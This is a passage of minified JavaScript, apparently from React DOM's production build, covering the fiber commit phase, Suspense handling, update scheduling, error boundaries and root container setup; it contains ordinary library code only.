b.type?c:aa(b.type,c),d);a.__reactInternalSnapshotBeforeUpdate=b}return;case 3:case 5:case 6:case 4:case 17:return}throw Error(k(163));}function Ah(a,b){b=b.updateQueue;b=null!==b?b.lastEffect:null;if(null!==b){var c=b=b.next;do{if((c.tag&a)===a){var d=c.destroy;c.destroy=void 0;void 0!==d&&d()}c=c.next}while(c!==b)}}function Bh(a,b){b=b.updateQueue;b=null!==b?b.lastEffect:null;if(null!==b){var c=b=b.next;do{if((c.tag&a)===a){var d=c.create;c.destroy=d()}c=c.next}while(c!==b)}}function oj(a,b,c,d){switch(c.tag){case 0:case 11:case 15:case 22:Bh(3,
c);return;case 1:a=c.stateNode;c.effectTag&4&&(null===b?a.componentDidMount():(d=c.elementType===c.type?b.memoizedProps:aa(c.type,b.memoizedProps),a.componentDidUpdate(d,b.memoizedState,a.__reactInternalSnapshotBeforeUpdate)));b=c.updateQueue;null!==b&&Wg(c,b,a);return;case 3:b=c.updateQueue;if(null!==b){a=null;if(null!==c.child)switch(c.child.tag){case 5:a=c.child.stateNode;break;case 1:a=c.child.stateNode}Wg(c,b,a)}return;case 5:a=c.stateNode;null===b&&c.effectTag&4&&lg(c.type,c.memoizedProps)&&
a.focus();return;case 6:return;case 4:return;case 12:return;case 13:null===c.memoizedState&&(c=c.alternate,null!==c&&(c=c.memoizedState,null!==c&&(c=c.dehydrated,null!==c&&bg(c))));return;case 19:case 17:case 20:case 21:return}throw Error(k(163));}function Ch(a,b,c){"function"===typeof Ne&&Ne(b);switch(b.tag){case 0:case 11:case 14:case 15:case 22:a=b.updateQueue;if(null!==a&&(a=a.lastEffect,null!==a)){var d=a.next;Da(97<c?97:c,function(){var a=d;do{var c=a.destroy;if(void 0!==c){var g=b;try{c()}catch(h){Za(g,
h)}}a=a.next}while(a!==d)})}break;case 1:zh(b);c=b.stateNode;"function"===typeof c.componentWillUnmount&&mj(b,c);break;case 5:zh(b);break;case 4:Dh(a,b,c)}}function Eh(a){var b=a.alternate;a.return=null;a.child=null;a.memoizedState=null;a.updateQueue=null;a.dependencies=null;a.alternate=null;a.firstEffect=null;a.lastEffect=null;a.pendingProps=null;a.memoizedProps=null;a.stateNode=null;null!==b&&Eh(b)}function Fh(a){return 5===a.tag||3===a.tag||4===a.tag}function Gh(a){a:{for(var b=a.return;null!==
b;){if(Fh(b)){var c=b;break a}b=b.return}throw Error(k(160));}b=c.stateNode;switch(c.tag){case 5:var d=!1;break;case 3:b=b.containerInfo;d=!0;break;case 4:b=b.containerInfo;d=!0;break;default:throw Error(k(161));}c.effectTag&16&&(Wb(b,""),c.effectTag&=-17);a:b:for(c=a;;){for(;null===c.sibling;){if(null===c.return||Fh(c.return)){c=null;break a}c=c.return}c.sibling.return=c.return;for(c=c.sibling;5!==c.tag&&6!==c.tag&&18!==c.tag;){if(c.effectTag&2)continue b;if(null===c.child||4===c.tag)continue b;
else c.child.return=c,c=c.child}if(!(c.effectTag&2)){c=c.stateNode;break a}}d?Oe(a,c,b):Pe(a,c,b)}function Oe(a,b,c){var d=a.tag,e=5===d||6===d;if(e)a=e?a.stateNode:a.stateNode.instance,b?8===c.nodeType?c.parentNode.insertBefore(a,b):c.insertBefore(a,b):(8===c.nodeType?(b=c.parentNode,b.insertBefore(a,c)):(b=c,b.appendChild(a)),c=c._reactRootContainer,null!==c&&void 0!==c||null!==b.onclick||(b.onclick=uc));else if(4!==d&&(a=a.child,null!==a))for(Oe(a,b,c),a=a.sibling;null!==a;)Oe(a,b,c),a=a.sibling}
function Pe(a,b,c){var d=a.tag,e=5===d||6===d;if(e)a=e?a.stateNode:a.stateNode.instance,b?c.insertBefore(a,b):c.appendChild(a);else if(4!==d&&(a=a.child,null!==a))for(Pe(a,b,c),a=a.sibling;null!==a;)Pe(a,b,c),a=a.sibling}function Dh(a,b,c){for(var d=b,e=!1,f,g;;){if(!e){e=d.return;a:for(;;){if(null===e)throw Error(k(160));f=e.stateNode;switch(e.tag){case 5:g=!1;break a;case 3:f=f.containerInfo;g=!0;break a;case 4:f=f.containerInfo;g=!0;break a}e=e.return}e=!0}if(5===d.tag||6===d.tag){a:for(var h=
a,m=d,n=c,l=m;;)if(Ch(h,l,n),null!==l.child&&4!==l.tag)l.child.return=l,l=l.child;else{if(l===m)break a;for(;null===l.sibling;){if(null===l.return||l.return===m)break a;l=l.return}l.sibling.return=l.return;l=l.sibling}g?(h=f,m=d.stateNode,8===h.nodeType?h.parentNode.removeChild(m):h.removeChild(m)):f.removeChild(d.stateNode)}else if(4===d.tag){if(null!==d.child){f=d.stateNode.containerInfo;g=!0;d.child.return=d;d=d.child;continue}}else if(Ch(a,d,c),null!==d.child){d.child.return=d;d=d.child;continue}if(d===
b)break;for(;null===d.sibling;){if(null===d.return||d.return===b)return;d=d.return;4===d.tag&&(e=!1)}d.sibling.return=d.return;d=d.sibling}}function Qe(a,b){switch(b.tag){case 0:case 11:case 14:case 15:case 22:Ah(3,b);return;case 1:return;case 5:var c=b.stateNode;if(null!=c){var d=b.memoizedProps,e=null!==a?a.memoizedProps:d;a=b.type;var f=b.updateQueue;b.updateQueue=null;if(null!==f){c[vc]=d;"input"===a&&"radio"===d.type&&null!=d.name&&If(c,d);Vd(a,e);b=Vd(a,d);for(e=0;e<f.length;e+=2){var g=f[e],
h=f[e+1];"style"===g?gg(c,h):"dangerouslySetInnerHTML"===g?xh(c,h):"children"===g?Wb(c,h):xd(c,g,h,b)}switch(a){case "input":Dd(c,d);break;case "textarea":Lf(c,d);break;case "select":b=c._wrapperState.wasMultiple,c._wrapperState.wasMultiple=!!d.multiple,a=d.value,null!=a?hb(c,!!d.multiple,a,!1):b!==!!d.multiple&&(null!=d.defaultValue?hb(c,!!d.multiple,d.defaultValue,!0):hb(c,!!d.multiple,d.multiple?[]:"",!1))}}}return;case 6:if(null===b.stateNode)throw Error(k(162));b.stateNode.nodeValue=b.memoizedProps;
return;case 3:b=b.stateNode;b.hydrate&&(b.hydrate=!1,bg(b.containerInfo));return;case 12:return;case 13:c=b;null===b.memoizedState?d=!1:(d=!0,c=b.child,Re=Y());if(null!==c)a:for(a=c;;){if(5===a.tag)f=a.stateNode,d?(f=f.style,"function"===typeof f.setProperty?f.setProperty("display","none","important"):f.display="none"):(f=a.stateNode,e=a.memoizedProps.style,e=void 0!==e&&null!==e&&e.hasOwnProperty("display")?e.display:null,f.style.display=fg("display",e));else if(6===a.tag)a.stateNode.nodeValue=d?
"":a.memoizedProps;else if(13===a.tag&&null!==a.memoizedState&&null===a.memoizedState.dehydrated){f=a.child.sibling;f.return=a;a=f;continue}else if(null!==a.child){a.child.return=a;a=a.child;continue}if(a===c)break;for(;null===a.sibling;){if(null===a.return||a.return===c)break a;a=a.return}a.sibling.return=a.return;a=a.sibling}Hh(b);return;case 19:Hh(b);return;case 17:return}throw Error(k(163));}function Hh(a){var b=a.updateQueue;if(null!==b){a.updateQueue=null;var c=a.stateNode;null===c&&(c=a.stateNode=
new pj);b.forEach(function(b){var d=qj.bind(null,a,b);c.has(b)||(c.add(b),b.then(d,d))})}}function Ih(a,b,c){c=Ea(c,null);c.tag=3;c.payload={element:null};var d=b.value;c.callback=function(){cd||(cd=!0,Se=d);Me(a,b)};return c}function Jh(a,b,c){c=Ea(c,null);c.tag=3;var d=a.type.getDerivedStateFromError;if("function"===typeof d){var e=b.value;c.payload=function(){Me(a,b);return d(e)}}var f=a.stateNode;null!==f&&"function"===typeof f.componentDidCatch&&(c.callback=function(){"function"!==typeof d&&
(null===La?La=new Set([this]):La.add(this),Me(a,b));var c=b.stack;this.componentDidCatch(b.value,{componentStack:null!==c?c:""})});return c}function ka(){return(p&(ca|ma))!==H?1073741821-(Y()/10|0):0!==dd?dd:dd=1073741821-(Y()/10|0)}function Va(a,b,c){b=b.mode;if(0===(b&2))return 1073741823;var d=Cc();if(0===(b&4))return 99===d?1073741823:1073741822;if((p&ca)!==H)return P;if(null!==c)a=Fc(a,c.timeoutMs|0||5E3,250);else switch(d){case 99:a=1073741823;break;case 98:a=Fc(a,150,100);break;case 97:case 96:a=
Fc(a,5E3,250);break;case 95:a=2;break;default:throw Error(k(326));}null!==U&&a===P&&--a;return a}function ed(a,b){a.expirationTime<b&&(a.expirationTime=b);var c=a.alternate;null!==c&&c.expirationTime<b&&(c.expirationTime=b);var d=a.return,e=null;if(null===d&&3===a.tag)e=a.stateNode;else for(;null!==d;){c=d.alternate;d.childExpirationTime<b&&(d.childExpirationTime=b);null!==c&&c.childExpirationTime<b&&(c.childExpirationTime=b);if(null===d.return&&3===d.tag){e=d.stateNode;break}d=d.return}null!==e&&
(U===e&&(Kc(b),F===bd&&Ya(e,P)),yh(e,b));return e}function fd(a){var b=a.lastExpiredTime;if(0!==b)return b;b=a.firstPendingTime;if(!Kh(a,b))return b;var c=a.lastPingedTime;a=a.nextKnownPendingLevel;a=c>a?c:a;return 2>=a&&b!==a?0:a}function V(a){if(0!==a.lastExpiredTime)a.callbackExpirationTime=1073741823,a.callbackPriority=99,a.callbackNode=Og(Te.bind(null,a));else{var b=fd(a),c=a.callbackNode;if(0===b)null!==c&&(a.callbackNode=null,a.callbackExpirationTime=0,a.callbackPriority=90);else{var d=ka();
1073741823===b?d=99:1===b||2===b?d=95:(d=10*(1073741821-b)-10*(1073741821-d),d=0>=d?99:250>=d?98:5250>=d?97:95);if(null!==c){var e=a.callbackPriority;if(a.callbackExpirationTime===b&&e>=d)return;c!==Qg&&Rg(c)}a.callbackExpirationTime=b;a.callbackPriority=d;b=1073741823===b?Og(Te.bind(null,a)):Ng(d,Lh.bind(null,a),{timeout:10*(1073741821-b)-Y()});a.callbackNode=b}}}function Lh(a,b){dd=0;if(b)return b=ka(),Ue(a,b),V(a),null;var c=fd(a);if(0!==c){b=a.callbackNode;if((p&(ca|ma))!==H)throw Error(k(327));
xb();a===U&&c===P||$a(a,c);if(null!==t){var d=p;p|=ca;var e=Mh();do try{rj();break}catch(h){Nh(a,h)}while(1);le();p=d;gd.current=e;if(F===hd)throw b=id,$a(a,c),Ya(a,c),V(a),b;if(null===t)switch(e=a.finishedWork=a.current.alternate,a.finishedExpirationTime=c,d=F,U=null,d){case Xa:case hd:throw Error(k(345));case Oh:Ue(a,2<c?2:c);break;case ad:Ya(a,c);d=a.lastSuspendedTime;c===d&&(a.nextKnownPendingLevel=Ve(e));if(1073741823===ta&&(e=Re+Ph-Y(),10<e)){if(jd){var f=a.lastPingedTime;if(0===f||f>=c){a.lastPingedTime=
c;$a(a,c);break}}f=fd(a);if(0!==f&&f!==c)break;if(0!==d&&d!==c){a.lastPingedTime=d;break}a.timeoutHandle=We(ab.bind(null,a),e);break}ab(a);break;case bd:Ya(a,c);d=a.lastSuspendedTime;c===d&&(a.nextKnownPendingLevel=Ve(e));if(jd&&(e=a.lastPingedTime,0===e||e>=c)){a.lastPingedTime=c;$a(a,c);break}e=fd(a);if(0!==e&&e!==c)break;if(0!==d&&d!==c){a.lastPingedTime=d;break}1073741823!==Yb?d=10*(1073741821-Yb)-Y():1073741823===ta?d=0:(d=10*(1073741821-ta)-5E3,e=Y(),c=10*(1073741821-c)-e,d=e-d,0>d&&(d=0),d=
(120>d?120:480>d?480:1080>d?1080:1920>d?1920:3E3>d?3E3:4320>d?4320:1960*sj(d/1960))-d,c<d&&(d=c));if(10<d){a.timeoutHandle=We(ab.bind(null,a),d);break}ab(a);break;case Xe:if(1073741823!==ta&&null!==kd){f=ta;var g=kd;d=g.busyMinDurationMs|0;0>=d?d=0:(e=g.busyDelayMs|0,f=Y()-(10*(1073741821-f)-(g.timeoutMs|0||5E3)),d=f<=e?0:e+d-f);if(10<d){Ya(a,c);a.timeoutHandle=We(ab.bind(null,a),d);break}}ab(a);break;default:throw Error(k(329));}V(a);if(a.callbackNode===b)return Lh.bind(null,a)}}return null}function Te(a){var b=
a.lastExpiredTime;b=0!==b?b:1073741823;if((p&(ca|ma))!==H)throw Error(k(327));xb();a===U&&b===P||$a(a,b);if(null!==t){var c=p;p|=ca;var d=Mh();do try{tj();break}catch(e){Nh(a,e)}while(1);le();p=c;gd.current=d;if(F===hd)throw c=id,$a(a,b),Ya(a,b),V(a),c;if(null!==t)throw Error(k(261));a.finishedWork=a.current.alternate;a.finishedExpirationTime=b;U=null;ab(a);V(a)}return null}function uj(){if(null!==bb){var a=bb;bb=null;a.forEach(function(a,c){Ue(c,a);V(c)});ha()}}function Qh(a,b){var c=p;p|=1;try{return a(b)}finally{p=
c,p===H&&ha()}}function Rh(a,b){var c=p;p&=-2;p|=Ye;try{return a(b)}finally{p=c,p===H&&ha()}}function $a(a,b){a.finishedWork=null;a.finishedExpirationTime=0;var c=a.timeoutHandle;-1!==c&&(a.timeoutHandle=-1,vj(c));if(null!==t)for(c=t.return;null!==c;){var d=c;switch(d.tag){case 1:d=d.type.childContextTypes;null!==d&&void 0!==d&&(q(G),q(B));break;case 3:tb();q(G);q(B);break;case 5:te(d);break;case 4:tb();break;case 13:q(D);break;case 19:q(D);break;case 10:me(d)}c=c.return}U=a;t=Sa(a.current,null);
P=b;F=Xa;id=null;Yb=ta=1073741823;kd=null;Xb=0;jd=!1}function Nh(a,b){do{try{le();Sc.current=Tc;if(Uc)for(var c=z.memoizedState;null!==c;){var d=c.queue;null!==d&&(d.pending=null);c=c.next}Ia=0;J=K=z=null;Uc=!1;if(null===t||null===t.return)return F=hd,id=b,t=null;a:{var e=a,f=t.return,g=t,h=b;b=P;g.effectTag|=2048;g.firstEffect=g.lastEffect=null;if(null!==h&&"object"===typeof h&&"function"===typeof h.then){var m=h;if(0===(g.mode&2)){var n=g.alternate;n?(g.updateQueue=n.updateQueue,g.memoizedState=
n.memoizedState,g.expirationTime=n.expirationTime):(g.updateQueue=null,g.memoizedState=null)}var l=0!==(D.current&1),k=f;do{var p;if(p=13===k.tag){var q=k.memoizedState;if(null!==q)p=null!==q.dehydrated?!0:!1;else{var w=k.memoizedProps;p=void 0===w.fallback?!1:!0!==w.unstable_avoidThisFallback?!0:l?!1:!0}}if(p){var y=k.updateQueue;if(null===y){var r=new Set;r.add(m);k.updateQueue=r}else y.add(m);if(0===(k.mode&2)){k.effectTag|=64;g.effectTag&=-2981;if(1===g.tag)if(null===g.alternate)g.tag=17;else{var O=
Ea(1073741823,null);O.tag=Jc;Fa(g,O)}g.expirationTime=1073741823;break a}h=void 0;g=b;var v=e.pingCache;null===v?(v=e.pingCache=new wj,h=new Set,v.set(m,h)):(h=v.get(m),void 0===h&&(h=new Set,v.set(m,h)));if(!h.has(g)){h.add(g);var x=xj.bind(null,e,m,g);m.then(x,x)}k.effectTag|=4096;k.expirationTime=b;break a}k=k.return}while(null!==k);h=Error((na(g.type)||"A React component")+" suspended while rendering, but no fallback UI was specified.\n\nAdd a <Suspense fallback=...> component higher in the tree to provide a loading indicator or placeholder to display."+
Bd(g))}F!==Xe&&(F=Oh);h=Le(h,g);k=f;do{switch(k.tag){case 3:m=h;k.effectTag|=4096;k.expirationTime=b;var A=Ih(k,m,b);Ug(k,A);break a;case 1:m=h;var u=k.type,B=k.stateNode;if(0===(k.effectTag&64)&&("function"===typeof u.getDerivedStateFromError||null!==B&&"function"===typeof B.componentDidCatch&&(null===La||!La.has(B)))){k.effectTag|=4096;k.expirationTime=b;var H=Jh(k,m,b);Ug(k,H);break a}}k=k.return}while(null!==k)}t=Sh(t)}catch(cj){b=cj;continue}break}while(1)}function Mh(a){a=gd.current;gd.current=
Tc;return null===a?Tc:a}function Vg(a,b){a<ta&&2<a&&(ta=a);null!==b&&a<Yb&&2<a&&(Yb=a,kd=b)}function Kc(a){a>Xb&&(Xb=a)}function tj(){for(;null!==t;)t=Th(t)}function rj(){for(;null!==t&&!yj();)t=Th(t)}function Th(a){var b=zj(a.alternate,a,P);a.memoizedProps=a.pendingProps;null===b&&(b=Sh(a));Uh.current=null;return b}function Sh(a){t=a;do{var b=t.alternate;a=t.return;if(0===(t.effectTag&2048)){b=hj(b,t,P);if(1===P||1!==t.childExpirationTime){for(var c=0,d=t.child;null!==d;){var e=d.expirationTime,
f=d.childExpirationTime;e>c&&(c=e);f>c&&(c=f);d=d.sibling}t.childExpirationTime=c}if(null!==b)return b;null!==a&&0===(a.effectTag&2048)&&(null===a.firstEffect&&(a.firstEffect=t.firstEffect),null!==t.lastEffect&&(null!==a.lastEffect&&(a.lastEffect.nextEffect=t.firstEffect),a.lastEffect=t.lastEffect),1<t.effectTag&&(null!==a.lastEffect?a.lastEffect.nextEffect=t:a.firstEffect=t,a.lastEffect=t))}else{b=lj(t);if(null!==b)return b.effectTag&=2047,b;null!==a&&(a.firstEffect=a.lastEffect=null,a.effectTag|=
2048)}b=t.sibling;if(null!==b)return b;t=a}while(null!==t);F===Xa&&(F=Xe);return null}function Ve(a){var b=a.expirationTime;a=a.childExpirationTime;return b>a?b:a}function ab(a){var b=Cc();Da(99,Aj.bind(null,a,b));return null}function Aj(a,b){do xb();while(null!==Zb);if((p&(ca|ma))!==H)throw Error(k(327));var c=a.finishedWork,d=a.finishedExpirationTime;if(null===c)return null;a.finishedWork=null;a.finishedExpirationTime=0;if(c===a.current)throw Error(k(177));a.callbackNode=null;a.callbackExpirationTime=
0;a.callbackPriority=90;a.nextKnownPendingLevel=0;var e=Ve(c);a.firstPendingTime=e;d<=a.lastSuspendedTime?a.firstSuspendedTime=a.lastSuspendedTime=a.nextKnownPendingLevel=0:d<=a.firstSuspendedTime&&(a.firstSuspendedTime=d-1);d<=a.lastPingedTime&&(a.lastPingedTime=0);d<=a.lastExpiredTime&&(a.lastExpiredTime=0);a===U&&(t=U=null,P=0);1<c.effectTag?null!==c.lastEffect?(c.lastEffect.nextEffect=c,e=c.firstEffect):e=c:e=c.firstEffect;if(null!==e){var f=p;p|=ma;Uh.current=null;Ze=tc;var g=kg();if(Xd(g)){if("selectionStart"in
g)var h={start:g.selectionStart,end:g.selectionEnd};else a:{h=(h=g.ownerDocument)&&h.defaultView||window;var m=h.getSelection&&h.getSelection();if(m&&0!==m.rangeCount){h=m.anchorNode;var n=m.anchorOffset,q=m.focusNode;m=m.focusOffset;try{h.nodeType,q.nodeType}catch(sb){h=null;break a}var ba=0,w=-1,y=-1,B=0,D=0,r=g,z=null;b:for(;;){for(var v;;){r!==h||0!==n&&3!==r.nodeType||(w=ba+n);r!==q||0!==m&&3!==r.nodeType||(y=ba+m);3===r.nodeType&&(ba+=r.nodeValue.length);if(null===(v=r.firstChild))break;z=r;
r=v}for(;;){if(r===g)break b;z===h&&++B===n&&(w=ba);z===q&&++D===m&&(y=ba);if(null!==(v=r.nextSibling))break;r=z;z=r.parentNode}r=v}h=-1===w||-1===y?null:{start:w,end:y}}else h=null}h=h||{start:0,end:0}}else h=null;$e={activeElementDetached:null,focusedElem:g,selectionRange:h};tc=!1;l=e;do try{Bj()}catch(sb){if(null===l)throw Error(k(330));Za(l,sb);l=l.nextEffect}while(null!==l);l=e;do try{for(g=a,h=b;null!==l;){var x=l.effectTag;x&16&&Wb(l.stateNode,"");if(x&128){var A=l.alternate;if(null!==A){var u=
A.ref;null!==u&&("function"===typeof u?u(null):u.current=null)}}switch(x&1038){case 2:Gh(l);l.effectTag&=-3;break;case 6:Gh(l);l.effectTag&=-3;Qe(l.alternate,l);break;case 1024:l.effectTag&=-1025;break;case 1028:l.effectTag&=-1025;Qe(l.alternate,l);break;case 4:Qe(l.alternate,l);break;case 8:n=l,Dh(g,n,h),Eh(n)}l=l.nextEffect}}catch(sb){if(null===l)throw Error(k(330));Za(l,sb);l=l.nextEffect}while(null!==l);u=$e;A=kg();x=u.focusedElem;h=u.selectionRange;if(A!==x&&x&&x.ownerDocument&&jg(x.ownerDocument.documentElement,
x)){null!==h&&Xd(x)&&(A=h.start,u=h.end,void 0===u&&(u=A),"selectionStart"in x?(x.selectionStart=A,x.selectionEnd=Math.min(u,x.value.length)):(u=(A=x.ownerDocument||document)&&A.defaultView||window,u.getSelection&&(u=u.getSelection(),n=x.textContent.length,g=Math.min(h.start,n),h=void 0===h.end?g:Math.min(h.end,n),!u.extend&&g>h&&(n=h,h=g,g=n),n=ig(x,g),q=ig(x,h),n&&q&&(1!==u.rangeCount||u.anchorNode!==n.node||u.anchorOffset!==n.offset||u.focusNode!==q.node||u.focusOffset!==q.offset)&&(A=A.createRange(),
A.setStart(n.node,n.offset),u.removeAllRanges(),g>h?(u.addRange(A),u.extend(q.node,q.offset)):(A.setEnd(q.node,q.offset),u.addRange(A))))));A=[];for(u=x;u=u.parentNode;)1===u.nodeType&&A.push({element:u,left:u.scrollLeft,top:u.scrollTop});"function"===typeof x.focus&&x.focus();for(x=0;x<A.length;x++)u=A[x],u.element.scrollLeft=u.left,u.element.scrollTop=u.top}tc=!!Ze;$e=Ze=null;a.current=c;l=e;do try{for(x=a;null!==l;){var F=l.effectTag;F&36&&oj(x,l.alternate,l);if(F&128){A=void 0;var E=l.ref;if(null!==
E){var G=l.stateNode;switch(l.tag){case 5:A=G;break;default:A=G}"function"===typeof E?E(A):E.current=A}}l=l.nextEffect}}catch(sb){if(null===l)throw Error(k(330));Za(l,sb);l=l.nextEffect}while(null!==l);l=null;Cj();p=f}else a.current=c;if(ld)ld=!1,Zb=a,$b=b;else for(l=e;null!==l;)b=l.nextEffect,l.nextEffect=null,l=b;b=a.firstPendingTime;0===b&&(La=null);1073741823===b?a===af?ac++:(ac=0,af=a):ac=0;"function"===typeof bf&&bf(c.stateNode,d);V(a);if(cd)throw cd=!1,a=Se,Se=null,a;if((p&Ye)!==H)return null;
ha();return null}function Bj(){for(;null!==l;){var a=l.effectTag;0!==(a&256)&&nj(l.alternate,l);0===(a&512)||ld||(ld=!0,Ng(97,function(){xb();return null}));l=l.nextEffect}}function xb(){if(90!==$b){var a=97<$b?97:$b;$b=90;return Da(a,Dj)}}function Dj(){if(null===Zb)return!1;var a=Zb;Zb=null;if((p&(ca|ma))!==H)throw Error(k(331));var b=p;p|=ma;for(a=a.current.firstEffect;null!==a;){try{var c=a;if(0!==(c.effectTag&512))switch(c.tag){case 0:case 11:case 15:case 22:Ah(5,c),Bh(5,c)}}catch(d){if(null===
a)throw Error(k(330));Za(a,d)}c=a.nextEffect;a.nextEffect=null;a=c}p=b;ha();return!0}function Vh(a,b,c){b=Le(c,b);b=Ih(a,b,1073741823);Fa(a,b);a=ed(a,1073741823);null!==a&&V(a)}function Za(a,b){if(3===a.tag)Vh(a,a,b);else for(var c=a.return;null!==c;){if(3===c.tag){Vh(c,a,b);break}else if(1===c.tag){var d=c.stateNode;if("function"===typeof c.type.getDerivedStateFromError||"function"===typeof d.componentDidCatch&&(null===La||!La.has(d))){a=Le(b,a);a=Jh(c,a,1073741823);Fa(c,a);c=ed(c,1073741823);null!==
c&&V(c);break}}c=c.return}}function xj(a,b,c){var d=a.pingCache;null!==d&&d.delete(b);U===a&&P===c?F===bd||F===ad&&1073741823===ta&&Y()-Re<Ph?$a(a,P):jd=!0:Kh(a,c)&&(b=a.lastPingedTime,0!==b&&b<c||(a.lastPingedTime=c,V(a)))}function qj(a,b){var c=a.stateNode;null!==c&&c.delete(b);b=0;0===b&&(b=ka(),b=Va(b,a,null));a=ed(a,b);null!==a&&V(a)}function Ej(a){if("undefined"===typeof __REACT_DEVTOOLS_GLOBAL_HOOK__)return!1;var b=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(b.isDisabled||!b.supportsFiber)return!0;try{var c=
b.inject(a);bf=function(a,e){try{b.onCommitFiberRoot(c,a,void 0,64===(a.current.effectTag&64))}catch(f){}};Ne=function(a){try{b.onCommitFiberUnmount(c,a)}catch(e){}}}catch(d){}return!0}function Fj(a,b,c,d){this.tag=a;this.key=c;this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null;this.index=0;this.ref=null;this.pendingProps=b;this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null;this.mode=d;this.effectTag=0;this.lastEffect=this.firstEffect=this.nextEffect=
null;this.childExpirationTime=this.expirationTime=0;this.alternate=null}function Ge(a){a=a.prototype;return!(!a||!a.isReactComponent)}function Gj(a){if("function"===typeof a)return Ge(a)?1:0;if(void 0!==a&&null!==a){a=a.$$typeof;if(a===zd)return 11;if(a===Ad)return 14}return 2}function Sa(a,b){var c=a.alternate;null===c?(c=la(a.tag,b,a.key,a.mode),c.elementType=a.elementType,c.type=a.type,c.stateNode=a.stateNode,c.alternate=a,a.alternate=c):(c.pendingProps=b,c.effectTag=0,c.nextEffect=null,c.firstEffect=
null,c.lastEffect=null);c.childExpirationTime=a.childExpirationTime;c.expirationTime=a.expirationTime;c.child=a.child;c.memoizedProps=a.memoizedProps;c.memoizedState=a.memoizedState;c.updateQueue=a.updateQueue;b=a.dependencies;c.dependencies=null===b?null:{expirationTime:b.expirationTime,firstContext:b.firstContext,responders:b.responders};c.sibling=a.sibling;c.index=a.index;c.ref=a.ref;return c}function Oc(a,b,c,d,e,f){var g=2;d=a;if("function"===typeof a)Ge(a)&&(g=1);else if("string"===typeof a)g=
5;else a:switch(a){case Ma:return Ha(c.children,e,f,b);case Hj:g=8;e|=7;break;case Af:g=8;e|=1;break;case kc:return a=la(12,c,b,e|8),a.elementType=kc,a.type=kc,a.expirationTime=f,a;case lc:return a=la(13,c,b,e),a.type=lc,a.elementType=lc,a.expirationTime=f,a;case yd:return a=la(19,c,b,e),a.elementType=yd,a.expirationTime=f,a;default:if("object"===typeof a&&null!==a)switch(a.$$typeof){case Cf:g=10;break a;case Bf:g=9;break a;case zd:g=11;break a;case Ad:g=14;break a;case Ef:g=16;d=null;break a;case Df:g=
22;break a}throw Error(k(130,null==a?a:typeof a,""));}b=la(g,c,b,e);b.elementType=a;b.type=d;b.expirationTime=f;return b}function Ha(a,b,c,d){a=la(7,a,d,b);a.expirationTime=c;return a}function qe(a,b,c){a=la(6,a,null,b);a.expirationTime=c;return a}function re(a,b,c){b=la(4,null!==a.children?a.children:[],a.key,b);b.expirationTime=c;b.stateNode={containerInfo:a.containerInfo,pendingChildren:null,implementation:a.implementation};return b}function Ij(a,b,c){this.tag=b;this.current=null;this.containerInfo=
a;this.pingCache=this.pendingChildren=null;this.finishedExpirationTime=0;this.finishedWork=null;this.timeoutHandle=-1;this.pendingContext=this.context=null;this.hydrate=c;this.callbackNode=null;this.callbackPriority=90;this.lastExpiredTime=this.lastPingedTime=this.nextKnownPendingLevel=this.lastSuspendedTime=this.firstSuspendedTime=this.firstPendingTime=0}function Kh(a,b){var c=a.firstSuspendedTime;a=a.lastSuspendedTime;return 0!==c&&c>=b&&a<=b}function Ya(a,b){var c=a.firstSuspendedTime,d=a.lastSuspendedTime;
c<b&&(a.firstSuspendedTime=b);if(d>b||0===c)a.lastSuspendedTime=b;b<=a.lastPingedTime&&(a.lastPingedTime=0);b<=a.lastExpiredTime&&(a.lastExpiredTime=0)}function yh(a,b){b>a.firstPendingTime&&(a.firstPendingTime=b);var c=a.firstSuspendedTime;0!==c&&(b>=c?a.firstSuspendedTime=a.lastSuspendedTime=a.nextKnownPendingLevel=0:b>=a.lastSuspendedTime&&(a.lastSuspendedTime=b+1),b>a.nextKnownPendingLevel&&(a.nextKnownPendingLevel=b))}function Ue(a,b){var c=a.lastExpiredTime;if(0===c||c>b)a.lastExpiredTime=b}
function md(a,b,c,d){var e=b.current,f=ka(),g=Vb.suspense;f=Va(f,e,g);a:if(c){c=c._reactInternalFiber;b:{if(Na(c)!==c||1!==c.tag)throw Error(k(170));var h=c;do{switch(h.tag){case 3:h=h.stateNode.context;break b;case 1:if(N(h.type)){h=h.stateNode.__reactInternalMemoizedMergedChildContext;break b}}h=h.return}while(null!==h);throw Error(k(171));}if(1===c.tag){var m=c.type;if(N(m)){c=Gg(c,m,h);break a}}c=h}else c=Ca;null===b.context?b.context=c:b.pendingContext=c;b=Ea(f,g);b.payload={element:a};d=void 0===
d?null:d;null!==d&&(b.callback=d);Fa(e,b);Ja(e,f);return f}function cf(a){a=a.current;if(!a.child)return null;switch(a.child.tag){case 5:return a.child.stateNode;default:return a.child.stateNode}}function Wh(a,b){a=a.memoizedState;null!==a&&null!==a.dehydrated&&a.retryTime<b&&(a.retryTime=b)}function df(a,b){Wh(a,b);(a=a.alternate)&&Wh(a,b)}function ef(a,b,c){c=null!=c&&!0===c.hydrate;var d=new Ij(a,b,c),e=la(3,null,null,2===b?7:1===b?3:0);d.current=e;e.stateNode=d;ne(e);a[Lb]=d.current;c&&0!==b&&
xi(a,9===a.nodeType?a:a.ownerDocument);this._internalRoot=d}function bc(a){return!(!a||1!==a.nodeType&&9!==a.nodeType&&11!==a.nodeType&&(8!==a.nodeType||" react-mount-point-unstable "!==a.nodeValue))}function Jj(a,b){b||(b=a?9===a.nodeType?a.documentElement:a.firstChild:null,b=!(!b||1!==b.nodeType||!b.hasAttribute("data-reactroot")));if(!b)for(var c;c=a.lastChild;)a.removeChild(c);return new ef(a,0,b?{hydrate:!0}:void 0)}function nd(a,b,c,d,e){var f=c._reactRootContainer;if(f){var g=f._internalRoot;
if("function"===typeof e){var h=e;e=function(){var a=cf(g);h.call(a)}}md(b,g,a,e)}else{f=c._reactRootContainer=Jj(c,d);g=f._internalRoot;if("function"===typeof e){var m=e;e=function(){var a=cf(g);m.call(a)}}Rh(function(){md(b,g,a,e)})}return cf(g)}function Kj(a,b,c){var d=3<arguments.length&&void 0!==arguments[3]?arguments[3]:null;return{$$typeof:gb,key:null==d?null:""+d,children:a,containerInfo:b,implementation:c}}function Xh(a,b){var c=2<arguments.length&&void 0!==arguments[2]?arguments[2]:null;
